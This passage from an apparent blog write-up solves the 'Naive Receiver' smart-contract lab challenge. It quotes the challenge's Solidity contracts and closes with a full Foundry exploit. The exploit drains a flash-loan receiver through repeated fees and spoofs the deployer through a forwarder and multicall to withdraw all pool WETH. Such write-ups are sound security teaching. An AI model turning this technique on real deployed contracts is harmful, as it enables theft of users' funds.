</span></span><span class=line><span class=ln>19</span><span class=cl>    <span class=n>deposits</span><span class=p>[</span><span class=n>feeReceiver</span><span class=p>]</span> <span class=o>+=</span> <span class=n>FIXED_FEE</span><span class=p>;</span>
</span></span><span class=line><span class=ln>20</span><span class=cl>
</span></span><span class=line><span class=ln>21</span><span class=cl>    <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=ln>22</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This function is from the <code>NaiveReceiverPool</code> contract. When someone calls the <code>flashLoan()</code> function, it will send the WETH tokens to the receiver passed and then call the <code>onFlashLoan</code> function. The receiver must pay back the WETH tokens within the same transaction along with the fee. If they fail to pay, the transaction will revert. While calling the <code>onFlashLoan</code> function, it will pass the address of <code>msg.sender</code> (loan initiator) as the first argument.</p><p>Since the <code>flashLoan()</code> is calling <code>onFlashLoan()</code> on the receiver, the receiver must be a contract.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl><span class=kd>function</span> <span class=nf>onFlashLoan</span><span class=p>(</span><span class=kt>address</span><span class=p>,</span> <span class=kt>address</span> <span class=n>token</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>amount</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>fee</span><span class=p>,</span> <span class=kt>bytes</span> <span class=n>calldata</span><span class=p>)</span>
</span></span><span class=line><span class=ln> 2</span><span class=cl>        <span class=k>external</span>
</span></span><span class=line><span class=ln> 3</span><span class=cl>        <span class=k>returns</span> <span class=p>(</span><span class=kt>bytes32</span><span class=p>)</span>
</span></span><span class=line><span class=ln> 4</span><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=ln> 5</span><span class=cl>    <span class=k>assembly</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 6</span><span class=cl>        <span class=c1>// gas savings
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=c1></span>        <span class=n>if</span> <span class=nf>iszero</span><span class=p>(</span><span class=nf>eq</span><span class=p>(</span><span class=nf>sload</span><span class=p>(</span><span class=n>pool</span><span class=err>.</span><span class=n>slot</span><span class=p>),</span> <span class=nf>caller</span><span class=p>()))</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 8</span><span class=cl>            <span class=nf>mstore</span><span class=p>(</span><span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x48f5c3ed</span><span class=p>)</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl>            <span class=nf>revert</span><span class=p>(</span><span class=mh>0x1c</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>)</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=ln>11</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>12</span><span class=cl>
</span></span><span class=line><span class=ln>13</span><span class=cl>    <span class=n>if</span> <span class=p>(</span><span class=n>token</span> <span class=err>!=</span> <span class=nf>address</span><span class=p>(</span><span class=n>NaiveReceiverPool</span><span class=p>(</span><span class=n>pool</span><span class=p>)</span><span class=err>.</span><span class=n>weth</span><span class=p>()))</span> <span class=nf>revert</span> <span class=n>NaiveReceiverPool</span><span class=err>.</span><span class=n>UnsupportedCurrency</span><span class=p>()</span><span class=err>;</span>
</span></span><span class=line><span class=ln>14</span><span class=cl>
</span></span><span class=line><span class=ln>15</span><span class=cl>    <span class=n>uint256</span> <span class=n>amountToBeRepaid</span><span class=err>;</span>
</span></span><span class=line><span class=ln>16</span><span class=cl>    <span class=n>unchecked</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>17</span><span class=cl>        <span class=n>amountToBeRepaid</span> <span class=err>=</span> <span class=n>amount</span> <span class=err>+</span> <span class=n>fee</span><span class=err>;</span>
</span></span><span class=line><span class=ln>18</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>19</span><span class=cl>
</span></span><span class=line><span class=ln>20</span><span class=cl>    <span class=n>_executeActionDuringFlashLoan</span><span class=p>()</span><span class=err>;</span>
</span></span><span class=line><span class=ln>21</span><span class=cl>
</span></span><span class=line><span class=ln>22</span><span class=cl>    <span class=c1>// Return funds to pool
</span></span></span><span class=line><span class=ln>23</span><span class=cl><span class=c1></span>    <span class=n>WETH</span><span class=p>(</span><span class=n>payable</span><span class=p>(</span><span class=n>token</span><span class=p>))</span><span class=err>.</span><span class=n>approve</span><span class=p>(</span><span class=n>pool</span><span class=p>,</span> <span class=n>amountToBeRepaid</span><span class=p>)</span><span class=err>;</span>
</span></span><span class=line><span class=ln>24</span><span class=cl>
</span></span><span class=line><span class=ln>25</span><span class=cl>    <span class=nf>return</span> <span class=nf>keccak256</span><span class=p>(</span><span class=s>&#34;ERC3156FlashBorrower.onFlashLoan&#34;</span><span class=p>)</span><span class=err>;</span>
</span></span><span class=line><span class=ln>26</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This function is from the <code>NaiveReceiver</code> contract. It will check if the pool has been set or not. If it is not set, it will revert; otherwise, it will continue executing. Then it will check whether the loan given is a WETH token or not. If it is not, it will revert; otherwise, it will continue execution. Then it will add the loan taken and the fee. Then it will call <code>_executeActionDuringFlashLoan()</code>. Once the call is completed, it will approve the pool contract to transfer WETH tokens and return the success message.</p><p>It is making all necessary checks, but it is not checking who actually executed the loan. So if we call the <code>flashLoan()</code> function in <code>NaiveReceiverPool</code> from our contract by passing the receiver as the receiver contract address, then it will initiate a loan to the receiver contract, and the receiver contract will use the loan amount and repay the loan amount along with the fee within the transaction.</p><p>Since the fee is 1 WETH token for every loan, it will transfer 1 WETH token. So if we initiate a loan to the receiver contract 10 times, then the receiver contract balance will be zero.</p><p>Our next goal is to make the pool balance as zero and transfer WETH from pool to recovery address.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln>1</span><span class=cl><span class=kd>function</span> <span class=nf>_msgSender</span><span class=p>()</span> <span class=k>internal</span> <span class=k>view</span> <span class=k>override</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>address</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>2</span><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>trustedForwarder</span> <span class=o>&amp;&amp;</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>data</span><span class=p>.</span><span class=n>length</span> <span class=o>&gt;=</span> <span class=mi>20</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>3</span><span class=cl>        <span class=k>return</span> <span class=kt>address</span><span class=p>(</span><span class=kt>bytes20</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>data</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>data</span><span class=p>.</span><span class=n>length</span> <span class=o>-</span> <span class=mi>20</span><span class=o>:</span><span class=p>]));</span>
</span></span><span class=line><span class=ln>4</span><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>5</span><span class=cl>        <span class=k>return</span> <span class=nb>super</span><span class=p>.</span><span class=n>_msgSender</span><span class=p>();</span>
</span></span><span class=line><span class=ln>6</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>7</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The above function is from the <code>NaiveReceiver</code> contract. When it is called, it will check if the <code>msg.sender</code> (caller) is the <code>BasicForwarder</code> contract or not. If it is the <code>BasicForwarder</code> contract, it will return the last 20 bytes of calldata sent by the <code>BasicForwarder</code> contract. If the <code>msg.sender</code> is another address, then it will just return the address of the caller.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl><span class=kd>function</span> <span class=nf>execute</span><span class=p>(</span><span class=n>Request</span> <span class=n>calldata</span> <span class=n>request</span><span class=p>,</span> <span class=kt>bytes</span> <span class=n>calldata</span> <span class=n>signature</span><span class=p>)</span> <span class=k>public</span> <span class=k>payable</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span> <span class=n>success</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 2</span><span class=cl>    <span class=n>_checkRequest</span><span class=p>(</span><span class=n>request</span><span class=p>,</span> <span class=n>signature</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 3</span><span class=cl>
</span></span><span class=line><span class=ln> 4</span><span class=cl>    <span class=n>nonces</span><span class=p>[</span><span class=n>request</span><span class=p>.</span><span class=k>from</span><span class=p>]</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 5</span><span class=cl>
</span></span><span class=line><span class=ln> 6</span><span class=cl>    <span class=kt>uint256</span> <span class=n>gasLeft</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 7</span><span class=cl>    <span class=kt>uint256</span> <span class=nb>value</span> <span class=o>=</span> <span class=n>request</span><span class=p>.</span><span class=nb>value</span><span class=p>;</span> <span class=c1>// in wei
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=c1></span>    <span class=kt>address</span> <span class=n>target</span> <span class=o>=</span> <span class=n>request</span><span class=p>.</span><span class=n>target</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl>    <span class=kt>bytes</span> <span class=k>memory</span> <span class=n>payload</span> <span class=o>=</span> <span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span><span class=n>request</span><span class=p>.</span><span class=nb>data</span><span class=p>,</span> <span class=n>request</span><span class=p>.</span><span class=k>from</span><span class=p>);</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>    <span class=kt>uint256</span> <span class=n>forwardGas</span> <span class=o>=</span> <span class=n>request</span><span class=p>.</span><span class=nb>gas</span><span class=p>;</span>
</span></span><span class=line><span class=ln>11</span><span class=cl>    <span class=k>assembly</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>12</span><span class=cl>        <span class=n>success</span> <span class=o>:=</span> <span class=nf>call</span><span class=p>(</span><span class=n>forwardGas</span><span class=p>,</span> <span class=n>target</span><span class=p>,</span> <span class=n>value</span><span class=p>,</span> <span class=nf>add</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>),</span> <span class=nf>mload</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=c1>// don&#39;t copy returndata
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=c1></span>        <span class=n>gasLeft</span> <span class=o>:=</span> <span class=nf>gas</span><span class=p>()</span>
</span></span><span class=line><span class=ln>14</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>15</span><span class=cl>
</span></span><span class=line><span class=ln>16</span><span class=cl>    <span class=n>if</span> <span class=p>(</span><span class=n>gasLeft</span> <span class=err>&lt;</span> <span class=n>request</span><span class=err>.</span><span class=nf>gas</span> <span class=err>/</span> <span class=mi>63</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>17</span><span class=cl>        <span class=n>assembly</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>18</span><span class=cl>            <span class=nf>invalid</span><span class=p>()</span>
</span></span><span class=line><span class=ln>19</span><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=ln>20</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>21</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The above function is from the <code>BasicForwarder</code> contract. It will check whether the signature passed to the function is signed by the <code>from</code> member of the struct. Once the <code>_checkRequest()</code> is passed, it will encode the <code>data</code> member and <code>from</code> member from the <code>Request</code> struct and assign it to <code>payload</code>. Then it will make a call to the <code>target</code> member of the <code>Request</code> struct passed. <code>payload</code> is calldata that is sent to the target. The last 20 bytes of <code>payload</code> will be the address of the <code>from</code> member of the <code>Request</code> struct.</p><p>Using the <code>execute</code> function, if we call any function in the <code>NaiveReceiverPool</code> contract other than <code>multicall()</code>, then <code>_msgSender()</code> in <code>NaiveReceiverPool</code> will return the address of the <code>from</code> member of the <code>Request</code> struct.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln>1</span><span class=cl><span class=kd>function</span> <span class=nf>multicall</span><span class=p>(</span><span class=kt>bytes</span><span class=p>[]</span> <span class=n>calldata</span> <span class=nb>data</span><span class=p>)</span> <span class=k>external</span> <span class=k>virtual</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bytes</span><span class=p>[]</span> <span class=k>memory</span> <span class=n>results</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>2</span><span class=cl>    <span class=n>results</span> <span class=o>=</span> <span class=k>new</span> <span class=kt>bytes</span><span class=p>[](</span><span class=nb>data</span><span class=p>.</span><span class=n>length</span><span class=p>);</span>
</span></span><span class=line><span class=ln>3</span><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nb>data</span><span class=p>.</span><span class=n>length</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>4</span><span class=cl>        <span class=n>results</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>Address</span><span class=p>.</span><span class=n>functionDelegateCall</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=nb>data</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=ln>5</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>6</span><span class=cl>    <span class=k>return</span> <span class=n>results</span><span class=p>;</span>
</span></span><span class=line><span class=ln>7</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>But using the <code>execute</code> function, if we call the <code>multicall()</code> function in <code>NaiveReceiverPool</code>, then <code>execute</code> will add the <code>from</code> member of the <code>Request</code> struct to the <code>data</code> member of the <code>Request</code> struct and pass it to <code>multicall()</code>. Since our data only contains calldata to call <code>multicall()</code>, the <code>multicall()</code> function won&rsquo;t care about the next 20 bytes appended by the <code>execute()</code> function to our actual data.</p><p>The <code>multicall()</code> function will take a bytes array as input and make a delegate call to <code>NaiveReceiverPool</code> by passing each element of the bytes array as data. Since we are calling <code>multicall()</code> using the <code>execute()</code> function in <code>BasicForwarder</code>, whatever data we need to pass to the <code>multicall()</code> function, we need to construct it before and send the data as the <code>data</code> member of the <code>Request</code> struct.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln>1</span><span class=cl><span class=kd>function</span> <span class=nf>withdraw</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>amount</span><span class=p>,</span> <span class=kt>address</span> <span class=k>payable</span> <span class=n>receiver</span><span class=p>)</span> <span class=k>external</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>2</span><span class=cl>    <span class=c1>// Reduce deposits
</span></span></span><span class=line><span class=ln>3</span><span class=cl><span class=c1></span>    <span class=n>deposits</span><span class=p>[</span><span class=n>_msgSender</span><span class=p>()]</span> <span class=o>-=</span> <span class=n>amount</span><span class=p>;</span>
</span></span><span class=line><span class=ln>4</span><span class=cl>    <span class=n>totalDeposits</span> <span class=o>-=</span> <span class=n>amount</span><span class=p>;</span>
</span></span><span class=line><span class=ln>5</span><span class=cl>
</span></span><span class=line><span class=ln>6</span><span class=cl>    <span class=c1>// Transfer ETH to designated receiver
</span></span></span><span class=line><span class=ln>7</span><span class=cl><span class=c1></span>    <span class=n>weth</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=n>receiver</span><span class=p>,</span> <span class=n>amount</span><span class=p>);</span>
</span></span><span class=line><span class=ln>8</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>So if we pass a bytes array containing calldata to the <code>withdraw()</code> function as an argument to <code>multicall()</code>, then it will check the necessary conditions and transfer WETH to the receiver from the address returned by <code>_msgSender()</code>.</p><p>When we call <code>multicall()</code>, it will make a delegate call. During a delegate call, the <code>msg.sender</code> and <code>msg.value</code> will be passed to the next call as the <code>msg.sender</code> who called the <code>multicall()</code> function and the <code>msg.value</code> sent during the <code>multicall()</code> function. However, <code>msg.data</code> will not be the same for both calls. For <code>multicall()</code>, the <code>msg.data</code> will be the data sent by <code>execute()</code>, and for <code>withdraw()</code>, the <code>msg.data</code> will be the data sent by the <code>multicall()</code> function.</p><p>So while constructing data for the <code>withdraw()</code> function, if we add an extra 20 bytes as the address of the deployer, then the <code>withdraw()</code> function will be called and it will call <code>_msgSender()</code>. <code>_msgSender()</code> will return the address of the deployer, and since the deployer is holding the entire WETH, the <code>NaiveReceiverPool</code> will transfer the WETH to whatever address we pass. Since our task is to transfer all WETH from <code>NaiveReceiverPool</code> to the recovery address, we need to pass the recovery address in the <code>withdraw()</code> function.</p><p>The below is the Exploit logic.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl><span class=kd>function</span> <span class=nf>test_naiveReceiver</span><span class=p>()</span> <span class=k>public</span> <span class=n>checkSolvedByPlayer</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 2</span><span class=cl>    <span class=c1>///////////////////////////////////
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=c1></span>    <span class=c1>// Empty Receiver Balance//////////
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=c1></span>    <span class=c1>///////////////////////////////////
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=c1></span>
</span></span><span class=line><span class=ln> 6</span><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>uint8</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>10</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 7</span><span class=cl>        <span class=n>pool</span><span class=p>.</span><span class=n>flashLoan</span><span class=p>(</span><span class=n>receiver</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=n>weth</span><span class=p>),</span> <span class=n>WETH_IN_POOL</span><span class=p>,</span> <span class=kt>bytes</span><span class=p>(</span><span class=s>&#34;&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=ln> 8</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl>
</span></span><span class=line><span class=ln>10</span><span class=cl>    <span class=c1>///////////////////////////////////
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=c1></span>    <span class=c1>// Withdraw All Funds To Recovery//
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=c1></span>    <span class=c1>///////////////////////////////////
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=c1></span>
</span></span><span class=line><span class=ln>14</span><span class=cl>    <span class=kt>uint256</span> <span class=n>total</span> <span class=o>=</span> <span class=n>WETH_IN_POOL</span> <span class=o>+</span> <span class=n>WETH_IN_RECEIVER</span><span class=p>;</span>
</span></span><span class=line><span class=ln>15</span><span class=cl>    <span class=kt>bytes</span> <span class=k>memory</span> <span class=n>Withdrawdata</span> <span class=o>=</span> <span class=nb>abi</span><span class=p>.</span><span class=nb>encodeWithSignature</span><span class=p>(</span><span class=s>&#34;withdraw(uint256,address)&#34;</span><span class=p>,</span> <span class=n>total</span><span class=p>,</span> <span class=n>recovery</span><span class=p>,</span> <span class=n>deployer</span><span class=p>);</span>
</span></span><span class=line><span class=ln>16</span><span class=cl>    <span class=kt>bytes</span><span class=p>[]</span> <span class=k>memory</span> <span class=n>multicall_data_array</span> <span class=o>=</span> <span class=k>new</span> <span class=kt>bytes</span><span class=p>[](</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=ln>17</span><span class=cl>    <span class=n>multicall_data_array</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>Withdrawdata</span><span class=p>;</span>
</span></span><span class=line><span class=ln>18</span><span class=cl>    <span class=kt>bytes</span> <span class=k>memory</span> <span class=n>multicallEncodedData</span> <span class=o>=</span> <span class=nb>abi</span><span class=p>.</span><span class=nb>encodeWithSignature</span><span class=p>(</span><span class=s>&#34;multicall(bytes[])&#34;</span><span class=p>,</span> <span class=n>multicall_data_array</span><span class=p>);</span>
</span></span><span class=line><span class=ln>19</span><span class=cl>    <span class=n>BasicForwarder</span><span class=p>.</span><span class=n>Request</span> <span class=k>memory</span> <span class=n>executeRequest</span> <span class=o>=</span> <span class=n>BasicForwarder</span><span class=p>.</span><span class=n>Request</span><span class=p>({</span>
</span></span><span class=line><span class=ln>20</span><span class=cl>        <span class=k>from</span><span class=o>:</span> <span class=n>player</span><span class=p>,</span>
</span></span><span class=line><span class=ln>21</span><span class=cl>        <span class=n>target</span><span class=o>:</span> <span class=kt>address</span><span class=p>(</span><span class=n>pool</span><span class=p>),</span>
</span></span><span class=line><span class=ln>22</span><span class=cl>        <span class=nb>value</span><span class=o>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=ln>23</span><span class=cl>        <span class=nb>gas</span><span class=o>:</span> <span class=mi>100000</span><span class=p>,</span>
</span></span><span class=line><span class=ln>24</span><span class=cl>        <span class=n>nonce</span><span class=o>:</span> <span class=n>vm</span><span class=p>.</span><span class=n>getNonce</span><span class=p>(</span><span class=n>player</span><span class=p>),</span>
</span></span><span class=line><span class=ln>25</span><span class=cl>        <span class=nb>data</span><span class=o>:</span> <span class=n>multicallEncodedData</span><span class=p>,</span>
</span></span><span class=line><span class=ln>26</span><span class=cl>        <span class=n>deadline</span><span class=o>:</span> <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span> <span class=o>+</span> <span class=mi>1000</span>
</span></span><span class=line><span class=ln>27</span><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=ln>28</span><span class=cl>
</span></span><span class=line><span class=ln>29</span><span class=cl>    <span class=kt>bytes32</span> <span class=n>digest</span> <span class=o>=</span>
</span></span><span class=line><span class=ln>30</span><span class=cl>        <span class=nb>keccak256</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\x19\x01</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>forwarder</span><span class=p>.</span><span class=n>domainSeparator</span><span class=p>(),</span> <span class=n>forwarder</span><span class=p>.</span><span class=n>getDataHash</span><span class=p>(</span><span class=n>executeRequest</span><span class=p>)));</span>
</span></span><span class=line><span class=ln>31</span><span class=cl>
</span></span><span class=line><span class=ln>32</span><span class=cl>    <span class=p>(</span><span class=kt>uint8</span> <span class=n>v</span><span class=p>,</span> <span class=kt>bytes32</span> <span class=n>r</span><span class=p>,</span> <span class=kt>bytes32</span> <span class=n>s</span><span class=p>)</span> <span class=o>=</span> <span class=n>vm</span><span class=p>.</span><span class=n>sign</span><span class=p>(</span><span class=n>playerPk</span><span class=p>,</span> <span class=n>digest</span><span class=p>);</span>
</span></span><span class=line><span class=ln>33</span><span class=cl>
</span></span><span class=line><span class=ln>34</span><span class=cl>    <span class=n>forwarder</span><span class=p>.</span><span class=n>execute</span><span class=p>(</span><span class=n>executeRequest</span><span class=p>,</span> <span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=n>v</span><span class=p>));</span>
</span></span><span class=line><span class=ln>35</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>That&rsquo;s it for this challenge. Hope you enjoyed it. If you have any queries, leave a comment below.</p></div></div></div><div class=card-footer><div class="post-navs d-flex justify-content-evenly"><div class="post-nav post-prev"><i class="fas fa-fw fa-chevron-down post-prev-icon me-1" data-fa-transform=rotate-90></i>
<a href=/blogs/tcp1p-2024/unsolvable-money-captcha/>Unsolvable Money Captcha</a></div></div></div></article><section class="related-posts row card component"><div class=card-header><h2 class="card-title fs-4 my-2 text-surface">Related Posts</h2></div><div class="card-body slide px-1"><div class="slide-inner row gx-0"><div class="col-12 col-md-6 col-lg-4 me-2"><div class="post-card card card-body p-0 border-0 surface"><div class="post-card-default-img card-img-top d-flex align-items-center justify-content-center bg-body-secondary mb-1">NO IMAGE</div><a class=post-title href=/blogs/ethernaut/gatekeeperthree/>GateKeeperThree</a><div class="post-meta mb-0">October 23, 2024</div></div></div><div class="col-12 col-md-6 col-lg-4 me-2"><div class="post-card card card-body p-0 border-0 surface"><div class="post-card-default-img card-img-top d-flex align-items-center justify-content-center bg-body-secondary mb-1">NO IMAGE</div><a class=post-title href=/blogs/ethernaut/puzzlewallet/>PuzzleWallet</a><div class="post-meta mb-0">October 23, 2024</div></div></div><div class="col-12 col-md-6 col-lg-4 me-2"><div class="post-card card card-body p-0 border-0 surface"><div class="post-card-default-img card-img-top d-flex align-items-center justify-content-center bg-body-secondary mb-1">NO IMAGE</div><a class=post-title href=/blogs/ethernaut/preservation/>Preservation</a><div class="post-meta mb-0">October 23, 2024</div></div></div><div class="col-12 col-md-6 col-lg-4 me-2"><div class="post-card card card-body p-0 border-0 surface"><div class="post-card-default-img card-img-top d-flex align-items-center justify-content-center bg-body-secondary mb-1">NO IMAGE</div><a class=post-title href=/blogs/ethernaut/gatekeepertwo/>GateKeeperTwo</a><div class="post-meta mb-0">October 23, 2024</div></div></div><div class="col-12 col-md-6 col-lg-4 me-2"><div class="post-card card card-body p-0 border-0 surface"><div class="post-card-default-img card-img-top d-flex align-items-center justify-content-center bg-body-secondary mb-1">NO IMAGE</div><a class=post-title href=/blogs/ethernaut/gatekeeperone/>GateKeeperOne</a><div class="post-meta mb-0">October 23, 2024</div></div></div></div><button class=slide-control-left>
<i class="fas fa-2x fa-chevron-circle-down" data-fa-transform=rotate-90></i>
<span class=visually-hidden>Left</span>
</button>
<button class=slide-control-right>
<i class="fas fa-2x fa-chevron-circle-down" data-fa-transform=rotate-270></i>
<span class=visually-hidden>Right</span></button></div></section><div class="card component row post-comments" id=post-comments><div class=card-header><h2 class="card-title my-2 fs-4 text-surface">Comments</h2></div><div class=card-body><div class=giscus></div></div></div></div></div><aside class="col-xxl-4 sidebar d-flex"><div class="container d-flex flex-column"><div class="accordion profile"><div class="accordion-item card row text-center component"><div class="accordion-header card-header border-0" id=profile-header><a class="accordion-button d-lg-none mb-2 shadow-none p-0 bg-transparent text-surface" role=button data-bs-toggle=collapse href=#profile aria-expanded=true aria-controls=profile>Profile</a></div><div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id=profile aria-labelledby=profile-header><div class="col-12 d-flex align-items-center justify-content-center"><picture><source srcset=https://s4bot3ur.github.io/images/avatar.webp type=image/webp><img class="profile-avatar rounded-circle" alt="Komal Rao" src loading=lazy data-viewer-invisible></picture></div><div class="col-12 profile-meta"><div class="profile-name fw-fold fs-lg">Komal Rao</div><div class=profile-bio>Web3 Security Researcher</div><div class=profile-company><i class="fas fa-fw fa-building"></i>Team Bi0s</div><div class=profile-location><i class="fas fa-fw fa-map-marker-alt"></i>Bharat</div></div><nav class="social-links nav justify-content-center mt-1 justify-content-around"><a class="nav-link social-link" target=_blank href=https://github.com/s4bot3ur title=GitHub rel=me><i class="fa-fw fa-2x fab fa-github"></i>
</a><a class="nav-link social-link" target=_blank href=https://linkedin.com/in/dheekonda-komal-rao-6bb68727b title=LinkedIn rel=me><i class="fa-fw fa-2x fab fa-linkedin-in" style=color:#0a66c2></i>
</a><a class="nav-link social-link" target=_blank href=https://medium.com/@s4bot3ur title=Medium rel=me><i class="fa-fw fa-2x fab fa-medium-m"></i>
</a><a class="nav-link social-link" target=_blank href=/authors/index.xml title=RSS rel=me><i class="fas fa-fw fa-2x fa-rss" style=color:#ea6221></i></a></nav></div></div></div><div class="accordion taxonomies-toggle"><div class="row card component accordion-item"><div class="accordion-header card-header border-0"><a class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent" role=button data-bs-toggle=collapse href=#taxonomies-toggle aria-expanded=true aria-controls=taxonomies-toggle>Taxonomies</a></div><div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id=taxonomies-toggle><ul class="nav nav-pills nav-fill" role=tablist><li class=nav-item role=presentation><button class="nav-link active" id=taxonomyCategoriesTab data-bs-toggle=tab data-bs-target=#taxonomyCategories type=button role=tab aria-controls=taxonomyCategories aria-selected=true>
Categories</button></li><li class=nav-item role=presentation><button class=nav-link id=taxonomyTagsTab data-bs-toggle=tab data-bs-target=#taxonomyTags type=button role=tab aria-controls=taxonomyTags aria-selected=true>
Tags</button></li><li class=nav-item role=presentation><button class=nav-link id=taxonomySeriesTab data-bs-toggle=tab data-bs-target=#taxonomySeries type=button role=tab aria-controls=taxonomySeries aria-selected=true>
Series</button></li><li class=nav-item role=presentation><button class=nav-link id=taxonomyArchivesTab data-bs-toggle=tab data-bs-target=#taxonomyArchives type=button role=tab aria-controls=taxonomyArchives aria-selected=true>
